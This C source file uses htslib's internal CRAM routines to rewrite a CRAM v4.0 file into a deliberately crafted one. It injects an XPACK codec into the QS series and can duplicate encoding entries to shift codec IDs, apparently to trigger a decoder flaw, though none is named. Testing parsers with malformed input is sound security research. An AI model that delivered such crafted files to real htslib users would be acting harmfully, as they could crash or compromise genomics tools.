/*
 * Inject an E_XPACK transform codec into the QS data series of a real
 * CRAM v4.0 file, using htslib's own container/block readers and writers.
 * All lengths and CRC32s are recomputed by the library on write.
 */
#define HTS_BUILDING_LIBRARY 1
#include <config.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include "cram/cram.h"

static unsigned char xpack_params[] = {4, 2, 0, 1, 1, 1, 0}; /* nbits=4 nval=2 rmap=0,1 sub=E_EXTERNAL size=1 cid=0 */
static int n_dup = 0;   /* duplicate BF entries created before QS to raise codec_id */

static int64_t gv(cram_fd *fd, unsigned char **cp, unsigned char *end) {
    int err = 0;
    char *p = (char *)*cp;
    int64_t v = fd->vv.varint_get32(&p, (char *)end, &err);
    *cp = (unsigned char *)p;
    if (err) { fprintf(stderr, "varint read error\n"); exit(2); }
    return v;
}

struct entry {
    unsigned char key[2];
    int64_t enc, size;
    unsigned char *params;
};

static unsigned char outbuf[65536];
static size_t outlen = 0;

static void putv(cram_fd *fd, int64_t v) {
    int n = fd->vv.varint_put32((char *)outbuf + outlen,
                                (char *)outbuf + sizeof(outbuf), (int32_t)v);
    if (n <= 0) { fprintf(stderr, "varint write error\n"); exit(2); }
    outlen += n;
}
static void app(const void *p, size_t n) {
    if (outlen + n > sizeof(outbuf)) { fprintf(stderr, "buffer overflow\n"); exit(2); }
    memcpy(outbuf + outlen, p, n);
    outlen += n;
}

static void patch_comp_hdr(cram_fd *fd, cram_block *b) {
    if (b->method != RAW) {
        if (cram_uncompress_block(b)) { fprintf(stderr, "uncompress failed\n"); exit(2); }
    }
    unsigned char *cp = (unsigned char *)b->data;
    unsigned char *end = cp + b->uncomp_size;
    int old_usize = b->uncomp_size;

    /* preservation map: copy verbatim */
    (void)gv(fd, &cp, end);                 /* map size */
    int64_t cnt = gv(fd, &cp, end);          /* map count */
    unsigned char *pmap_body = cp;
    for (int i = 0; i < cnt; i++) {
        unsigned char k0 = cp[0], k1 = cp[1];
        cp += 2;
        if (k0 == 'S' && k1 == 'M') cp += 5;
        else if (k0 == 'T' && k1 == 'D') {
            int64_t tdsz = gv(fd, &cp, end);
            cp += tdsz;
        } else cp += 1;
    }
    outlen = 0;
    app(b->data, pmap_body - (unsigned char *)b->data); /* map size + count */
    app(pmap_body, cp - pmap_body);                     /* map entries */

    /* record encoding map */
    (void)gv(fd, &cp, end);                 /* map size */
    cnt = gv(fd, &cp, end);                 /* map count */
    unsigned char *recbody = cp;
    struct entry e[256];
    for (int i = 0; i < cnt; i++) {
        e[i].key[0] = cp[0]; e[i].key[1] = cp[1];
        cp += 2;
        e[i].enc = gv(fd, &cp, end);
        e[i].size = gv(fd, &cp, end);
        e[i].params = cp;
        cp += e[i].size;
    }
    unsigned char *tag_start = cp;

    /* rebuild record map with BF first (codec_id 0), then QS (XPACK): BF
       consumes 0, XPACK's EXTERNAL sub consumes 1, XPACK itself gets 2 */
    unsigned char body[65536];
    size_t bodylen = 0;
#define BPUTV(v) do { \
        int n_ = fd->vv.varint_put32((char *)body + bodylen, \
                                     (char *)body + sizeof(body), (int32_t)(v)); \
        if (n_ <= 0) { fprintf(stderr, "body varint error\n"); exit(2); } \
        bodylen += n_; \
    } while (0)
#define BAPP(p_, n_) do { memcpy(body + bodylen, (p_), (n_)); bodylen += (n_); } while (0)

    BPUTV(cnt + n_dup);
    BAPP(e[0].key, 2);                      /* BF: one simple codec */
    BPUTV(e[0].enc);
    BPUTV(e[0].size);
        BAPP(e[0].params, e[0].size);
    for (int d = 0; d < n_dup; d++) {
        BAPP(e[0].key, 2);
        BPUTV(e[0].enc);
        BPUTV(e[0].size);
        BAPP(e[0].params, e[0].size);
    }
    BAPP("QS", 2);
    BPUTV(51);                              /* E_XPACK */
    BPUTV(sizeof(xpack_params));
    BAPP(xpack_params, sizeof(xpack_params));
    int n_patched = 0;
    for (int i = 0; i < cnt; i++) {
        if (e[i].key[0] == 'Q' && e[i].key[1] == 'S') { n_patched++; continue; }
        if (i == 0) continue;               /* BF already emitted above */
        BAPP(e[i].key, 2);
        BPUTV(e[i].enc);
        BPUTV(e[i].size);
        BAPP(e[i].params, e[i].size);
    }
    if (n_patched != 1) { fprintf(stderr, "expected one QS entry, found %d\n", n_patched); exit(2); }
    putv(fd, bodylen);                      /* new record map size */
    app(body, bodylen);

    /* tag encoding map: copy verbatim (map size varint + body) */
    app(tag_start, end - tag_start);

    free(b->data);
    b->data = malloc(outlen);
    if (!b->data) { perror("malloc"); exit(2); }
    memcpy(b->data, outbuf, outlen);
    b->alloc = b->uncomp_size = b->comp_size = outlen;
    b->method = RAW;
    printf("patched compression header: %d -> %d bytes, %d record entries, BF first then QS XPACK (codec_id=2)\n",
           old_usize, (int)outlen, (int)cnt);
}

static void patch_slice_hdr(cram_fd *fd, cram_block *b) {
    if (b->method != RAW) {
        if (cram_uncompress_block(b)) { fprintf(stderr, "slice uncompress failed\n"); exit(2); }
    }
    unsigned char *cp = (unsigned char *)b->data;
    unsigned char *end = cp + b->uncomp_size;
    int old_usize = b->uncomp_size;
    (void)gv(fd, &cp, end);  /* ref id (signed, same width here) */
    (void)gv(fd, &cp, end);  /* ref start (64-bit, one byte) */
    (void)gv(fd, &cp, end);  /* ref span */
    (void)gv(fd, &cp, end);  /* num records */
    (void)gv(fd, &cp, end);  /* record counter (64-bit, one byte) */
    unsigned char *p_nblocks = cp;
    int64_t nblocks = gv(fd, &cp, end);
    unsigned char *p_ncids = cp;
    int64_t ncids = gv(fd, &cp, end);
    unsigned char *ids = cp;
    for (int i = 0; i < ncids; i++) (void)gv(fd, &cp, end);
    unsigned char *rest = cp;

    outlen = 0;
    app(b->data, p_nblocks - (unsigned char *)b->data);
    putv(fd, nblocks + 1);
    putv(fd, ncids + 1);
    app(ids, rest - ids);
    putv(fd, 0);                            /* new external block content_id 0 */
    app(rest, end - rest);

    free(b->data);
    b->data = malloc(outlen);
    if (!b->data) { perror("malloc"); exit(2); }
    memcpy(b->data, outbuf, outlen);
    b->alloc = b->uncomp_size = b->comp_size = outlen;
    b->method = RAW;
    printf("patched slice header: %d -> %d bytes, blocks %ld->%ld ids %ld->%ld\n",
           old_usize, (int)outlen,
           (long)nblocks, (long)nblocks + 1, (long)ncids, (long)ncids + 1);
}

int main(int argc, char **argv) {
    const char *in_fn = argc > 1 ? argv[1] : "base.cram";
    const char *out_fn = argc > 2 ? argv[2] : "crafted.cram";
    if (argc > 3) n_dup = atoi(argv[3]);
    cram_fd *in = cram_open(in_fn, "rb");
    cram_fd *out = cram_open(out_fn, "wb");
    if (!in || !out) { perror("cram_open"); return 1; }
    if (cram_set_option(out, CRAM_OPT_VERSION, "4.0") != 0) {
        fprintf(stderr, "cannot set v4\n"); return 1;
    }
    /* cram_write_SAM_hdr() consults fd->header internally when mapping refs.
       Use a private copy so each cram_fd frees its own header on close. */
    out->header = sam_hdr_dup(in->header);
    out->no_ref  = in->no_ref;
    if (cram_write_SAM_hdr(out, out->header) != 0) {
        fprintf(stderr, "cannot write SAM header\n"); return 1;
    }

    int ci = 0, patched = 0, blocks_total = 0;
    for (;;) {
        cram_container *c = cram_read_container(in);
        if (!c) break;
        cram_block **blocks = calloc(c->num_blocks + 1, sizeof(*blocks));
        uint32_t old_len = 0;
        for (int i = 0; i < c->num_blocks; i++) {
            blocks[i] = cram_read_block(in);
            if (!blocks[i]) { fprintf(stderr, "block read failed\n"); return 1; }
            old_len += cram_block_size(blocks[i]);
        }
        if (c->num_records > 0 && !patched) {
            uint32_t old_chdr = cram_block_size(blocks[0]);
            patch_comp_hdr(in, blocks[0]);
            uint32_t new_chdr = cram_block_size(blocks[0]);
            for (int i = 0; i < c->num_landmarks; i++) {
                c->landmark[i] += (int32_t)(new_chdr - old_chdr);
            }
            int si = -1, ext = -1;
            for (int i = 1; i < c->num_blocks; i++) {
                if (blocks[i]->content_type == MAPPED_SLICE && si < 0) si = i;
                if (blocks[i]->content_type == EXTERNAL && ext < 0) ext = i;
            }
            if (si < 0 || ext < 0) { fprintf(stderr, "no slice / external block\n"); return 1; }
            patch_slice_hdr(in, blocks[si]);

            /* append an EXTERNAL block with content_id 0 (XPACK sub-codec source) */
            cram_block *nb = cram_new_block(EXTERNAL, 0);
            nb->method = RAW;
            nb->uncomp_size = nb->comp_size = nb->alloc = 16;
            nb->data = malloc(16);
            memset(nb->data, 0, 16);
            blocks[c->num_blocks] = nb;
            c->num_blocks++;
            patched = 1;
            printf("container %d: compression header %u -> %u, added cid=0 block; "
                   "container length %u -> %u\n", ci, old_chdr, new_chdr,
                   old_len, old_len + cram_block_size(nb) + (new_chdr - old_chdr));
        }
        uint32_t new_len = 0;
        for (int i = 0; i < c->num_blocks; i++) new_len += cram_block_size(blocks[i]);
        c->length = new_len;
        if (cram_write_container(out, c) != 0) { fprintf(stderr, "write container failed\n"); return 1; }
        for (int i = 0; i < c->num_blocks; i++) {
            if (cram_write_block(out, blocks[i]) != 0) { fprintf(stderr, "write block failed\n"); return 1; }
            cram_free_block(blocks[i]);
        }
        blocks_total += c->num_blocks;
        free(blocks);
        cram_free_container(c);
        ci++;
    }
    printf("wrote %d containers, %d blocks to %s\n", ci, blocks_total, out_fn);
    if (cram_close(in) != 0 || cram_close(out) != 0) { fprintf(stderr, "close failed\n"); return 1; }
    return patched ? 0 : 2;
}
